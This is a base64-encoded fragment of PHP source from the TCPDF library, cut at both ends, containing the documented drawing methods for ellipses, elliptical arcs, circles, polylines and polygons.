G9hdCAkeTAgT3JkaW5hdGUgb2YgY2VudGVyIHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICRyeCBIb3Jpem9udGFsIHJhZGl1cy4KCSAqIEBwYXJhbSBmbG9hdCAkcnkgVmVydGljYWwgcmFkaXVzIChpZiByeSA9IDAgdGhlbiBpcyBhIGNpcmNsZSwgc2VlIENpcmNsZSgpKS4gRGVmYXVsdCB2YWx1ZTogMC4KCSAqIEBwYXJhbSBmbG9hdCAkYW5nbGUgQW5nbGUgb3JpZW50ZWQgKGFudGktY2xvY2t3aXNlKS4gRGVmYXVsdCB2YWx1ZTogMC4KCSAqIEBwYXJhbSBmbG9hdCAkYXN0YXJ0IEFuZ2xlIHN0YXJ0IG9mIGRyYXcgbGluZS4gRGVmYXVsdCB2YWx1ZTogMC4KCSAqIEBwYXJhbSBmbG9hdCAkYWZpbmlzaCBBbmdsZSBmaW5pc2ggb2YgZHJhdyBsaW5lLiBEZWZhdWx0IHZhbHVlOiAzNjAuCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBTdHlsZSBvZiByZW5kZXJpbmcuIFNlZSB0aGUgZ2V0UGF0aFBhaW50T3BlcmF0b3IoKSBmdW5jdGlvbiBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KCSAqIEBwYXJhbSBhcnJheSAkbGluZV9zdHlsZSBMaW5lIHN0eWxlIG9mIGVsbGlwc2UuIEFycmF5IGxpa2UgZm9yIFNldExpbmVTdHlsZSgpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGxpbmUgc3R5bGUgKGVtcHR5IGFycmF5KS4KCSAqIEBwYXJhbSBhcnJheSAkZmlsbF9jb2xvciBGaWxsIGNvbG9yLiBGb3JtYXQ6IGFycmF5KEdSRVkpIG9yIGFycmF5KFIsRyxCKSBvciBhcnJheShDLE0sWSxLKSBvciBhcnJheShDLE0sWSxLLFNwb3RDb2xvck5hbWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gaW50ZWdlciAkbmMgTnVtYmVyIG9mIGN1cnZlcyB1c2VkIHRvIGRyYXcgYSA5MCBkZWdyZWVzIHBvcnRpb24gb2YgZWxsaXBzZS4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wOCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIEVsbGlwc2UoJHgwLCAkeTAsICRyeCwgJHJ5PTAsICRhbmdsZT0wLCAkYXN0YXJ0PTAsICRhZmluaXNoPTM2MCwgJHN0eWxlPScnLCAkbGluZV9zdHlsZT1hcnJheSgpLCAkZmlsbF9jb2xvcj1hcnJheSgpLCAkbmM9MikgewoJCWlmICgkdGhpcy0+c3RhdGUgIT0gMikgewoJCQlyZXR1cm47CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkcnkpIE9SICgkcnkgPT0gMCkpIHsKCQkJJHJ5ID0gJHJ4OwoJCX0KCQlpZiAoIShmYWxzZSA9PT0gc3RycG9zKCRzdHlsZSwgJ0YnKSkgQU5EIGlzX2FycmF5KCRmaWxsX2NvbG9yKSkgewoJCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoJGZpbGxfY29sb3IpOwoJCX0KCQkkb3AgPSBUQ1BERl9TVEFUSUM6OmdldFBhdGhQYWludE9wZXJhdG9yKCRzdHlsZSk7CgkJaWYgKCRvcCA9PSAnZicpIHsKCQkJJGxpbmVfc3R5bGUgPSBhcnJheSgpOwoJCX0KCQlpZiAoJGxpbmVfc3R5bGUpIHsKCQkJJHRoaXMtPnNldExpbmVTdHlsZSgkbGluZV9zdHlsZSk7CgkJfQoJCSR0aGlzLT5fb3V0ZWxsaXB0aWNhbGFyYygkeDAsICR5MCwgJHJ4LCAkcnksICRhbmdsZSwgJGFzdGFydCwgJGFmaW5pc2gsIGZhbHNlLCAkbmMsIHRydWUsIHRydWUsIGZhbHNlKTsKCQkkdGhpcy0+X291dCgkb3ApOwoJfQoKCS8qKgoJICogQXBwZW5kIGFuIGVsbGlwdGljYWwgYXJjIHRvIHRoZSBjdXJyZW50IHBhdGguCgkgKiBBbiBlbGxpcHNlIGlzIGZvcm1lZCBmcm9tIG4gQmV6aWVyIGN1cnZlcy4KCSAqIEBwYXJhbSBmbG9hdCAkeGMgQWJzY2lzc2Egb2YgY2VudGVyIHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICR5YyBPcmRpbmF0ZSBvZiBjZW50ZXIgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHJ4IEhvcml6b250YWwgcmFkaXVzLgoJICogQHBhcmFtIGZsb2F0ICRyeSBWZXJ0aWNhbCByYWRpdXMgKGlmIHJ5ID0gMCB0aGVuIGlzIGEgY2lyY2xlLCBzZWUgQ2lyY2xlKCkpLiBEZWZhdWx0IHZhbHVlOiAwLgoJICogQHBhcmFtIGZsb2F0ICR4YW5nIEFuZ2xlIGJldHdlZW4gdGhlIFgtYXhpcyBhbmQgdGhlIG1ham9yIGF4aXMgb2YgdGhlIGVsbGlwc2UuIERlZmF1bHQgdmFsdWU6IDAuCgkgKiBAcGFyYW0gZmxvYXQgJGFuZ3MgQW5nbGUgc3RhcnQgb2YgZHJhdyBsaW5lLiBEZWZhdWx0IHZhbHVlOiAwLgoJICogQHBhcmFtIGZsb2F0ICRhbmdmIEFuZ2xlIGZpbmlzaCBvZiBkcmF3IGxpbmUuIERlZmF1bHQgdmFsdWU6IDM2MC4KCSAqIEBwYXJhbSBib29sZWFuICRwaWUgaWYgdHJ1ZSBkbyBub3QgbWFyayB0aGUgYm9yZGVyIHBvaW50ICh1c2VkIHRvIGRyYXcgcGllIHNlY3RvcnMpLgoJICogQHBhcmFtIGludGVnZXIgJG5jIE51bWJlciBvZiBjdXJ2ZXMgdXNlZCB0byBkcmF3IGEgOTAgZGVncmVlcyBwb3J0aW9uIG9mIGVsbGlwc2UuCgkgKiBAcGFyYW0gYm9vbGVhbiAkc3RhcnRwb2ludCBpZiB0cnVlIG91dHB1dCBhIHN0YXJ0aW5nIHBvaW50LgoJICogQHBhcmFtIGJvb2xlYW4gJGNjdyBpZiB0cnVlIGRyYXdzIGluIGNvdW50ZXItY2xvY2t3aXNlLgoJICogQHBhcmFtIGJvb2xlYW4gJHN2ZyBpZiB0cnVlIHRoZSBhbmdsZXMgYXJlIGluIHN2ZyBtb2RlIChhbHJlYWR5IGNhbGN1bGF0ZWQpLgoJICogQHJldHVybiBhcnJheSBib3VuZGluZyBib3ggY29vcmRpbmF0ZXMgKHggbWluLCB5IG1pbiwgeCBtYXgsIHkgbWF4KQoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjkuMDE5ICgyMDEwLTA0LTI2KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX291dGVsbGlwdGljYWxhcmMoJHhjLCAkeWMsICRyeCwgJHJ5LCAkeGFuZz0wLCAkYW5ncz0wLCAkYW5nZj0zNjAsICRwaWU9ZmFsc2UsICRuYz0yLCAkc3RhcnRwb2ludD10cnVlLCAkY2N3PXRydWUsICRzdmc9ZmFsc2UpIHsKCQlpZiAoKCRyeCA8PSAwKSBPUiAoJHJ5IDwgMCkpIHsKCQkJcmV0dXJuOwoJCX0KCQkkayA9ICR0aGlzLT5rOwoJCWlmICgkbmMgPCAyKSB7CgkJCSRuYyA9IDI7CgkJfQoJCSR4bWluID0gMjE0NzQ4MzY0NzsKCQkkeW1pbiA9IDIxNDc0ODM2NDc7CgkJJHhtYXggPSAwOwoJCSR5bWF4ID0gMDsKCQlpZiAoJHBpZSkgewoJCQkvLyBjZW50ZXIgb2YgdGhlIGFyYwoJCQkkdGhpcy0+X291dFBvaW50KCR4YywgJHljKTsKCQl9CgkJJHhhbmcgPSBkZWcycmFkKChmbG9hdCkgJHhhbmcpOwoJCSRhbmdzID0gZGVnMnJhZCgoZmxvYXQpICRhbmdzKTsKCQkkYW5nZiA9IGRlZzJyYWQoKGZsb2F0KSAkYW5nZik7CgkJaWYgKCRzdmcpIHsKCQkJJGFzID0gJGFuZ3M7CgkJCSRhZiA9ICRhbmdmOwoJCX0gZWxzZSB7CgkJCSRhcyA9IGF0YW4yKChzaW4oJGFuZ3MpIC8gJHJ5KSwgKGNvcygkYW5ncykgLyAkcngpKTsKCQkJJGFmID0gYXRhbjIoKHNpbigkYW5nZikgLyAkcnkpLCAoY29zKCRhbmdmKSAvICRyeCkpOwoJCX0KCQlpZiAoJGFzIDwgMCkgewoJCQkkYXMgKz0gKDIgKiBNX1BJKTsKCQl9CgkJaWYgKCRhZiA8IDApIHsKCQkJJGFmICs9ICgyICogTV9QSSk7CgkJfQoJCWlmICgkY2N3IEFORCAoJGFzID4gJGFmKSkgewoJCQkvLyByZXZlcnNlIHJvdGF0aW9uCgkJCSRhcyAtPSAoMiAqIE1fUEkpOwoJCX0gZWxzZWlmICghJGNjdyBBTkQgKCRhcyA8ICRhZikpIHsKCQkJLy8gcmV2ZXJzZSByb3RhdGlvbgoJCQkkYWYgLT0gKDIgKiBNX1BJKTsKCQl9CgkJJHRvdGFsX2FuZ2xlID0gKCRhZiAtICRhcyk7CgkJaWYgKCRuYyA8IDIpIHsKCQkJJG5jID0gMjsKCQl9CgkJLy8gdG90YWwgYXJjcyB0byBkcmF3CgkJJG5jICo9ICgyICogYWJzKCR0b3RhbF9hbmdsZSkgLyBNX1BJKTsKCQkkbmMgPSByb3VuZCgkbmMpICsgMTsKCQkvLyBhbmdsZSBvZiBlYWNoIGFyYwoJCSRhcmNhbmcgPSAoJHRvdGFsX2FuZ2xlIC8gJG5jKTsKCQkvLyBjZW50ZXIgcG9pbnQgaW4gUERGIGNvb3JkaW5hdGVzCgkJJHgwID0gJHhjOwoJCSR5MCA9ICgkdGhpcy0+aCAtICR5Yyk7CgkJLy8gc3RhcnRpbmcgYW5nbGUKCQkkYW5nID0gJGFzOwoJCSRhbHBoYSA9IHNpbigkYXJjYW5nKSAqICgoc3FydCg0ICsgKDMgKiBwb3codGFuKCgkYXJjYW5nKSAvIDIpLCAyKSkpIC0gMSkgLyAzKTsKCQkkY29zX3hhbmcgPSBjb3MoJHhhbmcpOwoJCSRzaW5feGFuZyA9IHNpbigkeGFuZyk7CgkJJGNvc19hbmcgPSBjb3MoJGFuZyk7CgkJJHNpbl9hbmcgPSBzaW4oJGFuZyk7CgkJLy8gZmlyc3QgYXJjIHBvaW50CgkJJHB4MSA9ICR4MCArICgkcnggKiAkY29zX3hhbmcgKiAkY29zX2FuZykgLSAoJHJ5ICogJHNpbl94YW5nICogJHNpbl9hbmcpOwoJCSRweTEgPSAkeTAgKyAoJHJ4ICogJHNpbl94YW5nICogJGNvc19hbmcpICsgKCRyeSAqICRjb3NfeGFuZyAqICRzaW5fYW5nKTsKCQkvLyBmaXJzdCBCZXppZXIgY29udHJvbCBwb2ludAoJCSRxeDEgPSAoJGFscGhhICogKCgtJHJ4ICogJGNvc194YW5nICogJHNpbl9hbmcpIC0gKCRyeSAqICRzaW5feGFuZyAqICRjb3NfYW5nKSkpOwoJCSRxeTEgPSAoJGFscGhhICogKCgtJHJ4ICogJHNpbl94YW5nICogJHNpbl9hbmcpICsgKCRyeSAqICRjb3NfeGFuZyAqICRjb3NfYW5nKSkpOwoJCWlmICgkcGllKSB7CgkJCS8vIGxpbmUgZnJvbSBjZW50ZXIgdG8gYXJjIHN0YXJ0aW5nIHBvaW50CgkJCSR0aGlzLT5fb3V0TGluZSgkcHgxLCAkdGhpcy0+aCAtICRweTEpOwoJCX0gZWxzZWlmICgkc3RhcnRwb2ludCkgewoJCQkvLyBhcmMgc3RhcnRpbmcgcG9pbnQKCQkJJHRoaXMtPl9vdXRQb2ludCgkcHgxLCAkdGhpcy0+aCAtICRweTEpOwoJCX0KCQkvLyBkcmF3IGFyY3MKCQlmb3IgKCRpID0gMTsgJGkgPD0gJG5jOyArKyRpKSB7CgkJCS8vIHN0YXJ0aW5nIGFuZ2xlCgkJCSRhbmcgPSAkYXMgKyAoJGkgKiAkYXJjYW5nKTsKCQkJaWYgKCRpID09ICRuYykgewoJCQkJJGFuZyA9ICRhZjsKCQkJfQoJCQkkY29zX2FuZyA9IGNvcygkYW5nKTsKCQkJJHNpbl9hbmcgPSBzaW4oJGFuZyk7CgkJCS8vIHNlY29uZCBhcmMgcG9pbnQKCQkJJHB4MiA9ICR4MCArICgkcnggKiAkY29zX3hhbmcgKiAkY29zX2FuZykgLSAoJHJ5ICogJHNpbl94YW5nICogJHNpbl9hbmcpOwoJCQkkcHkyID0gJHkwICsgKCRyeCAqICRzaW5feGFuZyAqICRjb3NfYW5nKSArICgkcnkgKiAkY29zX3hhbmcgKiAkc2luX2FuZyk7CgkJCS8vIHNlY29uZCBCZXppZXIgY29udHJvbCBwb2ludAoJCQkkcXgyID0gKCRhbHBoYSAqICgoLSRyeCAqICRjb3NfeGFuZyAqICRzaW5fYW5nKSAtICgkcnkgKiAkc2luX3hhbmcgKiAkY29zX2FuZykpKTsKCQkJJHF5MiA9ICgkYWxwaGEgKiAoKC0kcnggKiAkc2luX3hhbmcgKiAkc2luX2FuZykgKyAoJHJ5ICogJGNvc194YW5nICogJGNvc19hbmcpKSk7CgkJCS8vIGRyYXcgYXJjCgkJCSRjeDEgPSAoJHB4MSArICRxeDEpOwoJCQkkY3kxID0gKCR0aGlzLT5oIC0gKCRweTEgKyAkcXkxKSk7CgkJCSRjeDIgPSAoJHB4MiAtICRxeDIpOwoJCQkkY3kyID0gKCR0aGlzLT5oIC0gKCRweTIgLSAkcXkyKSk7CgkJCSRjeDMgPSAkcHgyOwoJCQkkY3kzID0gKCR0aGlzLT5oIC0gJHB5Mik7CgkJCSR0aGlzLT5fb3V0Q3VydmUoJGN4MSwgJGN5MSwgJGN4MiwgJGN5MiwgJGN4MywgJGN5Myk7CgkJCS8vIGdldCBib3VuZGluZyBib3ggY29vcmRpbmF0ZXMKCQkJJHhtaW4gPSBtaW4oJHhtaW4sICRjeDEsICRjeDIsICRjeDMpOwoJCQkkeW1pbiA9IG1pbigkeW1pbiwgJGN5MSwgJGN5MiwgJGN5Myk7CgkJCSR4bWF4ID0gbWF4KCR4bWF4LCAkY3gxLCAkY3gyLCAkY3gzKTsKCQkJJHltYXggPSBtYXgoJHltYXgsICRjeTEsICRjeTIsICRjeTMpOwoJCQkvLyBtb3ZlIHRvIG5leHQgcG9pbnQKCQkJJHB4MSA9ICRweDI7CgkJCSRweTEgPSAkcHkyOwoJCQkkcXgxID0gJHF4MjsKCQkJJHF5MSA9ICRxeTI7CgkJfQoJCWlmICgkcGllKSB7CgkJCSR0aGlzLT5fb3V0TGluZSgkeGMsICR5Yyk7CgkJCS8vIGdldCBib3VuZGluZyBib3ggY29vcmRpbmF0ZXMKCQkJJHhtaW4gPSBtaW4oJHhtaW4sICR4Yyk7CgkJCSR5bWluID0gbWluKCR5bWluLCAkeWMpOwoJCQkkeG1heCA9IG1heCgkeG1heCwgJHhjKTsKCQkJJHltYXggPSBtYXgoJHltYXgsICR5Yyk7CgkJfQoJCXJldHVybiBhcnJheSgkeG1pbiwgJHltaW4sICR4bWF4LCAkeW1heCk7Cgl9CgoJLyoqCgkgKiBEcmF3cyBhIGNpcmNsZS4KCSAqIEEgY2lyY2xlIGlzIGZvcm1lZCBmcm9tIG4gQmV6aWVyIGN1cnZlcy4KCSAqIEBwYXJhbSBmbG9hdCAkeDAgQWJzY2lzc2Egb2YgY2VudGVyIHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICR5MCBPcmRpbmF0ZSBvZiBjZW50ZXIgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHIgUmFkaXVzLgoJICogQHBhcmFtIGZsb2F0ICRhbmdzdHIgQW5nbGUgc3RhcnQgb2YgZHJhdyBsaW5lLiBEZWZhdWx0IHZhbHVlOiAwLgoJICogQHBhcmFtIGZsb2F0ICRhbmdlbmQgQW5nbGUgZmluaXNoIG9mIGRyYXcgbGluZS4gRGVmYXVsdCB2YWx1ZTogMzYwLgoJICogQHBhcmFtIHN0cmluZyAkc3R5bGUgU3R5bGUgb2YgcmVuZGVyaW5nLiBTZWUgdGhlIGdldFBhdGhQYWludE9wZXJhdG9yKCkgZnVuY3Rpb24gZm9yIG1vcmUgaW5mb3JtYXRpb24uCgkgKiBAcGFyYW0gYXJyYXkgJGxpbmVfc3R5bGUgTGluZSBzdHlsZSBvZiBjaXJjbGUuIEFycmF5IGxpa2UgZm9yIFNldExpbmVTdHlsZSgpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGxpbmUgc3R5bGUgKGVtcHR5IGFycmF5KS4KCSAqIEBwYXJhbSBhcnJheSAkZmlsbF9jb2xvciBGaWxsIGNvbG9yLiBGb3JtYXQ6IGFycmF5KHJlZCwgZ3JlZW4sIGJsdWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gaW50ZWdlciAkbmMgTnVtYmVyIG9mIGN1cnZlcyB1c2VkIHRvIGRyYXcgYSA5MCBkZWdyZWVzIHBvcnRpb24gb2YgY2lyY2xlLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBDaXJjbGUoJHgwLCAkeTAsICRyLCAkYW5nc3RyPTAsICRhbmdlbmQ9MzYwLCAkc3R5bGU9JycsICRsaW5lX3N0eWxlPWFycmF5KCksICRmaWxsX2NvbG9yPWFycmF5KCksICRuYz0yKSB7CgkJJHRoaXMtPkVsbGlwc2UoJHgwLCAkeTAsICRyLCAkciwgMCwgJGFuZ3N0ciwgJGFuZ2VuZCwgJHN0eWxlLCAkbGluZV9zdHlsZSwgJGZpbGxfY29sb3IsICRuYyk7Cgl9CgoJLyoqCgkgKiBEcmF3cyBhIHBvbHlnb25hbCBsaW5lCgkgKiBAcGFyYW0gYXJyYXkgJHAgUG9pbnRzIDAgdG8gKCRucCAtIDEpLiBBcnJheSB3aXRoIHZhbHVlcyAoeDAsIHkwLCB4MSwgeTEsLi4uLCB4KG5wLTEpLCB5KG5wIC0gMSkpCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBTdHlsZSBvZiByZW5kZXJpbmcuIFNlZSB0aGUgZ2V0UGF0aFBhaW50T3BlcmF0b3IoKSBmdW5jdGlvbiBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KCSAqIEBwYXJhbSBhcnJheSAkbGluZV9zdHlsZSBMaW5lIHN0eWxlIG9mIHBvbHlnb24uIEFycmF5IHdpdGgga2V5cyBhbW9uZyB0aGUgZm9sbG93aW5nOgoJICogPHVsPgoJICoJIDxsaT5hbGw6IExpbmUgc3R5bGUgb2YgYWxsIGxpbmVzLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS48L2xpPgoJICoJIDxsaT4wIHRvICgkbnAgLSAxKTogTGluZSBzdHlsZSBvZiBlYWNoIGxpbmUuIEFycmF5IGxpa2UgZm9yIFNldExpbmVTdHlsZSgpLjwvbGk+CgkgKiA8L3VsPgoJICogSWYgYSBrZXkgaXMgbm90IHByZXNlbnQgb3IgaXMgbnVsbCwgbm90IGRyYXdzIHRoZSBsaW5lLiBEZWZhdWx0IHZhbHVlIGlzIGRlZmF1bHQgbGluZSBzdHlsZSAoZW1wdHkgYXJyYXkpLgoJICogQHBhcmFtIGFycmF5ICRmaWxsX2NvbG9yIEZpbGwgY29sb3IuIEZvcm1hdDogYXJyYXkoR1JFWSkgb3IgYXJyYXkoUixHLEIpIG9yIGFycmF5KEMsTSxZLEspIG9yIGFycmF5KEMsTSxZLEssU3BvdENvbG9yTmFtZSkuIERlZmF1bHQgdmFsdWU6IGRlZmF1bHQgY29sb3IgKGVtcHR5IGFycmF5KS4KCSAqIEBzaW5jZSA0LjguMDAzICgyMDA5LTA5LTE1KQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gUG9seUxpbmUoJHAsICRzdHlsZT0nJywgJGxpbmVfc3R5bGU9YXJyYXkoKSwgJGZpbGxfY29sb3I9YXJyYXkoKSkgewoJCSR0aGlzLT5Qb2x5Z29uKCRwLCAkc3R5bGUsICRsaW5lX3N0eWxlLCAkZmlsbF9jb2xvciwgZmFsc2UpOwoJfQoKCS8qKgoJICogRHJhd3MgYSBwb2x5Z29uLgoJICogQHBhcmFtIGFycmF5ICRwIFBvaW50cyAwIHRvICgkbnAgLSAxKS4gQXJyYXkgd2l0aCB2YWx1ZXMgKHgwLCB5MCwgeDEsIHkxLC4uLiwgeChucC0xKSwgeShucCAtIDEpKQoJICogQHBhcmFtIHN0cmluZyAkc3R5bGUgU3R5bGUgb2YgcmVuZGVyaW5nLiBTZWUgdGhlIGdldFBhdGhQYWludE9wZXJhdG9yKCkgZnVuY3Rpb24gZm9yIG1vcmUgaW5mb3JtYXRpb24uCgkgKiBAcGFyYW0gYXJyYXkgJGxpbmVfc3R5bGUgTGluZSBzdHlsZSBvZiBwb2x5Z29uLiBBcnJheSB3aXRoIGtleXMgYW1vbmcgdGhlIGZvbGxvd2luZzoKCSAqIDx1bD4KCSAqCSA8bGk+YWxsOiBMaW5lIHN0eWxlIG9mIGFsbCBsaW5lcy4gQXJyYXkgbGlrZSBmb3IgU2V0TGluZVN0eWxlKCkuPC9saT4KCSAqCSA8bGk+MCB0byAoJG5wIC0gMSk6IExpbmUgc3R5bGUgb2YgZWFjaCBsaW5lLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS48L2xpPgoJICogPC91bD4KCSAqIElmIGEga2V5IGlzIG5vdCBwcmVzZW50IG9yIGlzIG51bGwsIG5vdCBkcmF3cyB0aGUgbGluZS4gRGVmYXVsdCB2YWx1ZSBpcyBkZWZhdWx0IGxpbmUgc3R5bGUgKGVtcHR5IGFycmF5KS4KCSAqIEBwYXJhbSBhcnJheSAkZmlsbF9jb2xvciBGaWxsIGNvbG9yLiBGb3JtYXQ6IGFycmF5KEdSRVkpIG9yIGFycmF5KFIsRyxCKSBvciBhcnJheShDLE0sWSxLKSBvciBhcnJheShDLE0sWSxLLFNwb3RDb2xvck5hbWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gYm9vbGVhbiAkY2xvc2VkIGlmIHRydWUgdGhlIHBvbHlnb24gaXMgY2xvc2VzLCBvdGhlcndpc2Ugd2lsbCByZW1haW4gb3BlbgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBQb2x5Z29uKCRwLCAkc3R5bGU9JycsICRsaW5lX3N0eWxlPWFycmF5KCksICRmaWxsX2NvbG9yPWFycmF5KCksICRjbG9zZWQ9dHJ1ZSkgewoJCWlmICgkdGhpcy0+c3RhdGUgIT0gMikgewoJCQlyZXR1cm47CgkJfQoJCSRuYyA9IGNvdW50KCRwKTsgLy8gbnVtYmVyIG9mIGNvb3JkaW5hdGVzCgkJJG5wID0gJG5jIC8gMjsgLy8gbnVtYmVyIG9mIHBvaW50cwoJCWlmICgkY2xvc2VkKSB7CgkJCS8vIGNsb3NlIHBvbHlnb24gYnkgYWRkaW5nIHRoZSBmaXJzdCAyIHBvaW50cyBhdCB0aGUgZW5kIChvbmUgbGluZSkKCQkJZm9yICgkaSA9IDA7ICRpIDwgNDsgKyskaSkgewoJCQkJJHBbJG5jICsgJGldID0gJHBbJGldOwoJCQl9CgkJCS8vIGNvcHkgc3R5bGUgZm9yIHRoZSBsYXN0IGFkZGVkIGxpbmUKCQkJaWYgKGlzc2V0KCRsaW5lX3N0eWxlWzBdKSkgewoJCQkJJGxpbmVfc3R5bGVbJG5wXSA9ICRsaW5lX3N0eWxlWzBdOwoJCQl9CgkJCSRuYyArPSA0OwoJCX0KCQlpZiAoIShmYWxzZSA9PT0gc3RycG9zKCRzdHlsZSwgJ0YnKSkgQU5EIGlzX2FycmF5KCRmaWxsX2NvbG9yKSkgewoJCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoJGZpbGxfY29sb3IpOwoJCX0KCQkkb3AgPSBUQ1BERl9TVEFUSUM6OmdldFBhdGhQYWludE9wZXJhdG9yKCRzdHlsZSk7CgkJaWYgKCRvcCA9PSAnZicpIHsKCQkJJGxpbmVfc3R5bGUgPSBhcnJheSgpOwoJCX0KCQkkZHJhdyA9IHRydWU7CgkJaWYgKCRsaW5lX3N0eWxlKSB7CgkJCWlmIChpc3NldCgkbGluZV9zdHlsZVsnYWxsJ10pKSB7CgkJCQkkdGhpcy0+c2V0TGluZVN0eWxlKCRsaW5lX3N0eWxlWydhbGwnXSk7CgkJCX0gZWxzZSB7CgkJCQkkZHJhdyA9IGZhbHNlOwoJCQkJaWYgKCRvcCA9PSAnQicpIHsKCQkJCQkvLyBkcmF3IGZpbGwKCQkJCQkkb3AgPSAnZic7CgkJCQkJJHRoaXMtPl9vdXRQb2ludCgkcFswXSwgJHBbMV0pOwoJCQkJCWZvciAoJGkgPSAyOyAkaSA8ICRuYzsgJGkgPSAkaSArIDIpIHsKCQkJCQkJJHRoaXMtPl9vdXRMaW5lKCRwWyRpXSwgJHBbJGkgKyAxXSk7CgkJCQkJfQoJCQkJCSR0aGlzLT5fb3V0KCRvcCk7CgkJCQl9CgkJCQkvLyBkcmF3IG91dGxpbmUKCQkJCSR0aGlzLT5fb3V0UG9pbnQoJHBbMF0sICRwWzFdKTsKCQkJCWZvciAoJGkgPSAyOyAkaSA8ICRuYzsgJGkgPSAkaSArIDIpIHsKCQkJCQkkbGluZV9udW0gPSAoJGkgLyAyKSAtIDE7CgkJCQkJaWYgKGlzc2V0KCRsaW5lX3N0eWxlWyRsaW5lX251bV0pKSB7CgkJCQkJCWlmICgkbGluZV9zdHlsZVskbGluZV9udW1dICE9IDApIHsKCQkJCQkJCWlmIChpc19hcnJheSgkbGluZV9zdHlsZVskbGluZV9udW1dKSkgewoJCQkJCQkJCSR0aGlzLT5fb3V0KCdTJyk7CgkJCQkJCQkJJHRoaXMtPnNldExpbmVTdHlsZSgkbGluZV9zdHlsZVskbGluZV9udW1dKTsKCQkJCQkJCQkkdGhpcy0+X291dFBvaW50KCRwWyRpIC0gMl0sICRwWyRpIC0gMV0pOwoJCQkJCQkJCSR0aGlzLT5fb3V0TGluZSgkcFskaV0sICRwWyRpICsgMV0pOwoJCQkJCQkJCSR0aGlzLT5fb3V0KCdTJyk7CgkJCQkJCQkJJHRoaXMtPl9vdXRQb2ludCgkcFskaV0sICRwWyRpICsgMV0pOwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkdGhpcy0+X291dExpbmUoJHBbJGldLCAkcFskaSArIDFdKTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0gZWxzZSB7CgkJCQkJCSR0aGlzLT5fb3V0TGluZSgkcFskaV0sICRwWyRpICsgMV0pOwoJCQkJCX0KCQkJCX0KCQkJCSR0aGlzLT5fb3V0KCRvcCk7CgkJCX0KCQl9CgkJaWYgKCRkcmF3KSB7CgkJCSR0aGlzLT5fb3V0UG9pbnQoJHBbMF0sICRwWzFdKTsKCQkJZm9yICgkaSA9IDI7ICRpIDwgJG5jOyAkaSA9ICRpICsgMikgewoJCQkJJHRoaXMtPl9vdXRMaW5lKCRwWyRpXSwgJHBbJGkgKyAxXSk7CgkJCX0KCQkJJHRoaXMtPl9vdXQoJG9wKTsKCQl9Cgl9CgoJLyoqCgkgKiBEcmF3cyBhIHJlZ3VsYXIgcG9seWdvbi4KCSAqIEBwYXJhbSBmbG9hdCAkeDAgQWJzY2lzc2Egb2YgY2VudGVyIHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICR5MCBPcmRpbmF0ZSBvZiBjZW50ZXIgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHIgUmFkaXVzIG9mIGluc2NyaWJlZCBjaXJjbGUuCgkgKiBAcGFyYW0gaW50ZWdlciAkbnMgTnVtYmVyIG9mIHNpZGVzLgoJICogQHBhcmFtIGZsb2F0ICRhbmdsZSBBbmdsZSBvcmllbnRlZCAoYW50aS1jbG9ja3dpc2UpLiBEZWZhdWx0IHZhbHVlOiAwLgoJICogQHBhcmFtIGJvb2xlYW4gJGRyYXdfY2lyY2xlIERyYXcgaW5zY3JpYmVkIGNpcmNsZSBvciBub3QuIERlZmF1bHQgdmFsdWU6IGZhbHNlLgoJICogQHBhcmFtIHN0cmluZyAkc3R5bGUgU3R5bGUgb2YgcmVuZGVyaW5nLiBTZWUgdGhlIGdldFBhdGhQYWludE9wZXJhdG9yKCkgZnVuY3Rpb24gZm9yIG1vcmUgaW5mb3JtYXRpb24uCgkgKiBAcGFyYW0gYXJyYXkgJGxpbmVfc3R5bGUgTGluZSBzdHlsZSBvZiBwb2x5Z29uIHNpZGVzLiBBcnJheSB3aXRoIGtleXMgYW1vbmcgdGhlIGZvbGxvd2luZzoKCSAqIDx1bD4KCSAqCSA8bGk+YWxsOiBMaW5lIHN0eWxlIG9mIGFsbCBzaWRlcy4gQXJyYXkgbGlrZSBmb3IgU2V0TGluZVN0eWxlKCkuPC9saT4KCSAqCSA8bGk+MCB0byAoJG5zIC0gMSk6IExpbmUgc3R5bGUgb2YgZWFjaCBzaWRlLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS48L2xp